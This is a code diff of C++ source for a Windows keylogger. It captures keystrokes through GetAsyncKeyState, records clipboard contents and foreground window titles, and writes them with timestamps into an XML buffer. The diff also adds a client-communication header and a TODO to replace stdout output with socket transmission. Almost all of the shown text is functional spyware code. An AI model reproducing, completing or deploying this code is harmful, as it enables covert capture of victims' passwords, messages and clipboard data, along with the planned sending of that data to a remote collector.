@@ -1,6 +1,8 @@
 #include "KeyLogger.h"
 #include "Sanitize_KeyLogBuff.h"
+#include "KeyLogger_clientCom.h"
 #include <stdio.h>
+
 char* last_cb_data;
 XML_PROCESS_BUFFER current_process_data;
 using namespace std;
@@ -9,7 +11,41 @@ const time_t hms = time(0);
 clock_t Timer = clock(), Timer2;
 bool gotchar=true;
 
-FORCEINLINE char* _USER_SHIFT_FOCUS(HWND _PROG_HNDL)
+/**
+    Title: _USER_SHIFT_FOCUS
+    Description: called when the user shifts focus to a new foreground window
+    this function should complete and write several new xml tags to describe the
+    foreground window now in progress. the tag written should be a starter tag to the
+    process, followed by the process handle, pid, process title, and a timestamp,
+    finally this process should complete xml tags that describe the capture taking place.
+    the output written to the buffer should appear as follows, the process data should contain a
+    <![CDATA[ . . . . ]] tag. and the capture should initiate the <[CDATA[ TAG
+    the following information should be written to the buffer
+
+        <Process>
+                <ProcessHandle>
+                        .....
+                </ProcessHandle>
+                <ProcessID>
+                        .....
+                <ProcessID>
+                <ProcessTitle><[CDATA[
+                        .....
+                ]]></ProcessTitle>
+                <TimeStamp>
+                        .....
+                </TimeStamp>
+                <logged>
+                    <CaptureType>Keylogger</CaptureType>
+                    <Capture><[CDATA[
+
+
+    @param _PROG_HNDLE: a handle to the current foreground process
+                type: HWND
+
+    @return NULL: their is no return for this function.
+*/
+FORCEINLINE void _USER_SHIFT_FOCUS(HWND _PROG_HNDL)
 {
     char* temp = (char*)malloc(0x0A);
     /*
@@ -30,13 +66,10 @@ FORCEINLINE char* _USER_SHIFT_FOCUS(HWND _PROG_HNDL)
     */
     TimeStamp[strlen(TimeStamp)-1]=0x00;
     /*
-        print out the xml meta data relevant to the process.
+        output the process metadata with relevant tags to the current_process_data buffer
     */
 
-/*    cout<<"\n\t<Process>\n\t\t<ProcessHandle>"<<_PROG_HNDL<<"</ProcessHandle>\n\t\t<ProcessID>"<<GetWindowThreadProcessId(_PROG_HNDL,NULL)
-    <<"</ProcessID>\n\t\t<title>\n\t\t\t<ProcessTitle><![CDATA["<<_GRAB_WINDOW_TITLE<<"]]></ProcessTitle>\n\t\t\t<TimeStamp>"<<TimeStamp<<"</TimeStamp>\n\t\t\t<logged>"
-    <<"\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[";
-*/    current_process_data = writeUnsanitizedBuffer(current_process_data,"\n\t<Process>\n\t\t<ProcessHandle>");
+    current_process_data = writeUnsanitizedBuffer(current_process_data,"\n\t<Process>\n\t\t<ProcessHandle>");
     sprintf(temp,"0x%lu",_PROG_HNDL);
     current_process_data = writeUnsanitizedBuffer(current_process_data,temp);
     current_process_data = writeUnsanitizedBuffer(current_process_data,"</ProcessHandle>\n\t\t<ProcessID>");
@@ -49,9 +82,33 @@ FORCEINLINE char* _USER_SHIFT_FOCUS(HWND _PROG_HNDL)
     current_process_data = writeUnsanitizedBuffer(current_process_data,
                                                   "</TimeStamp>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[");
 
-    return 0 ;
-}
 
+}
+/**
+    title: EnterEvent
+    Description: this is called to determine if the title of the current foreground window has changed.
+    if the title of the current process has changed. this function should close multiple xml tags,
+    then initiate new tags to document the functions of the new tags. else this function should fall through!
+    t
+    he following xml tags should be written to the buffer.
+
+                ]]></Capture>
+            </Logged>
+        </title>
+        <title>
+            <ProcessTitle><![CDATA[
+                    ...... ]]
+            </ProcessTitle>
+            <TimeStamp>
+                    ......
+            </TimeStamp>
+            <CaptureType>KeyLogger</CaptureType>
+                <Capture><![CDATA[
+
+    @param _PROG_HNDL this is a handle to the current foreground window.
+
+    @return NULL: their is no return from this program!
+*/
 FORCEINLINE void EnterEvent(HWND _PROG_HNDL)
 {   /*
         grab the length of the current foreground window title
@@ -82,11 +139,10 @@ FORCEINLINE void EnterEvent(HWND _PROG_HNDL)
         */
         TimeStamp[strlen(TimeStamp)-1]=0x00;
         /*
-            generate the proper xml output for a change of title on a process.
+            generate the proper xml output for a change of title on a process. and
+            register it to the current_process_buffer
         */
-  /*      cout<<"]]></Capture>\n\t\t\t</logged>\n\t\t</title>\n\t\t<title>\n\t\t\t<ProcessTitle><![CDATA["<<_GRAB_WINDOW_TITLE_SECONDARY<<"]]></ProcessTitle>\n\t\t\t<TimeStamp>"<<
-        TimeStamp<<"</TimeStamp>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[";
-  */      current_process_data = writeUnsanitizedBuffer(current_process_data,"]]></Capture>\n\t\t\t</logged>\n\t\t</title>\n\t\t<title>\n\t\t\t<ProcessTitle><![CDATA[");
+        current_process_data = writeUnsanitizedBuffer(current_process_data,"]]></Capture>\n\t\t\t</logged>\n\t\t</title>\n\t\t<title>\n\t\t\t<ProcessTitle><![CDATA[");
         current_process_data = writeSanitizedBuffer(current_process_data,_GRAB_WINDOW_TITLE_SECONDARY);
         current_process_data = writeUnsanitizedBuffer(current_process_data,"]]></ProcessTitle>\n\t\t\t<TimeStamp>");
         current_process_data = writeSanitizedBuffer(current_process_data,TimeStamp);
@@ -138,16 +194,7 @@ FORCEINLINE int GrabKey(int VkPrimary,char Primary, char Secondary, int LastKeyS
                         xml character. if so log sanitized character codes
                     */
                     current_process_data = writeSanitizedByte(current_process_data,temp);
-/*                   switch(temp)
-                   {
-                     case '<':  cout << "&lt;"; break;
-                     case '>':  cout << "&gt;"; break;
-                     case '&':  cout << "&amp;"; break;
-                     case '\'':  cout << "&apos;"; break;
-                     case '"':  cout << "&quot;"; break;
-                     default:  cout << temp; break;
-                   }
-*/                   /*
+                   /*
                         set the state for the last key stroke logged, this will
                         allow the program to determine that the keyboard buffer
                         has not yet been flushed.
@@ -180,17 +227,7 @@ FORCEINLINE int GrabKey(int VkPrimary,char Primary, char Secondary, int LastKeyS
                         if so shoot out sanitized xml character codes
                    */
                 current_process_data = writeSanitizedByte(current_process_data,temp);
-
- /*                  switch(temp)
-                   {
-                     case '<':  cout << "&lt;"; break;
-                     case '>':  cout << "&gt;"; break;
-                     case '&':  cout << "&amp;"; break;
-                     case '\'':  cout << "&apos;"; break;
-                     case '"':  cout << "&quot;"; break;
-                     default:  cout << temp; break;
-                   }
-  */                 /*
+                    /*
                         set the state of the last key stroke logged so
                         this will allow the program to determine that the
                         keyboard buffer has not yet been flushed.
@@ -234,10 +271,10 @@ FORCEINLINE int GrabFuncKey(char FunctionKey, char* StrOut,int LastKeyStrokeLogg
                    */
                    Timer2=Timer;
                    /*
-                        put the string representing a function key to the string
+                        put the string representing a function key to the current_process_data
+                        buffer
                    */
                     current_process_data = writeSanitizedBuffer(current_process_data,StrOut);
-    //                cout<<StrOut;
                     /*
                         set the state of the last key stroke logged so
                         this will allow the program to determine that the
@@ -339,13 +376,8 @@ FORCEINLINE int grabclipboard()
                         strncpy(last_cb_data,this_cb_data,strlen(this_cb_data));
 
                         /*
-                            print all the necessary meta data for the clipboard
-                                NOTE:L, a sanitizer function for the xml still has to be written.
+                          write all necessary xml tags and metadata out
                         */
-/*                        cout<<"]]></Capture>\n\t\t\t</logged>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>ClipBoard</CaptureType>"<<
-                        "\n\t\t\t\t<Capture>"<<(char*)this_cb_data<<"</Capture>\n\t\t\t</logged>\n\t\t\t<logged>"<<
-                        "\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[" ;
-*/
                          current_process_data = writeUnsanitizedBuffer(current_process_data,
                                 "]]></Capture>\n\t\t\t</logged>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>ClipBoard</CaptureType>\n\t\t\t\t<Capture>");
                          current_process_data = writeSanitizedBuffer(current_process_data,(char*)this_cb_data);
@@ -387,7 +419,6 @@ int main()
     /*
         display an xml header to generate the end document.
     */
-   // cout << "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n";
     current_process_data = writeUnsanitizedBuffer(current_process_data,
     "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n");
     /*
@@ -425,9 +456,9 @@ int main()
                 be trusted
             */
             if (GetAsyncKeyState(LastKeyStrokeLogged)== AsyncKeyStateTest_0 or GetAsyncKeyState(LastKeyStrokeLogged)==AsyncKeyStateTest_1)
-                LastKeyStrokeLogged=1;
-                /*default failed buffers to a state of (1)*/
-
+              {/*default failed buffers to a state of (1)*/
+                  LastKeyStrokeLogged=1;
+              }
             /*
                 increment an anonymous value starting at the "0" position of the ASCII table and increment to
                 "9".
@@ -477,12 +508,24 @@ int main()
                 complete the xml statements that were previously initialized then
                 initialize a new process xml tag.
             */
- //           cout<<"]]></Capture>\n\t\t\t</logged>\n\t\t</title>\n\t</Process>";
             current_process_data = writeUnsanitizedBuffer(current_process_data,"]]></Capture>\n\t\t\t</logged>\n\t\t</title>\n\t</Process>");
             current_process_data = writeUnsanitizedByte(current_process_data,(char)0x00);
-                cout<<current_process_data.buffered_data;
+            /*
+                for now, use stdout to log file changes,
+                    eventually this will be socket socket level communication
+            */
+            cout<<current_process_data.buffered_data; ///TODO: socket communication
+            /*
+                reallocate the buffer to the default slab size.
+            */
             current_process_data.buffered_data = (char*)realloc(current_process_data.buffered_data,DefaultBufferSz);
+            /*
+                re-initiate the buffer size to its default parameter.
+            */
             current_process_data.buffer_size=DefaultBufferSz;
+            /*
+                reset the current offset in the buffer to 0.
+            */
             current_process_data.current_buff_offset=0;
             /*
                 get the current foreground window and store it in the CURRENTPROCESS.
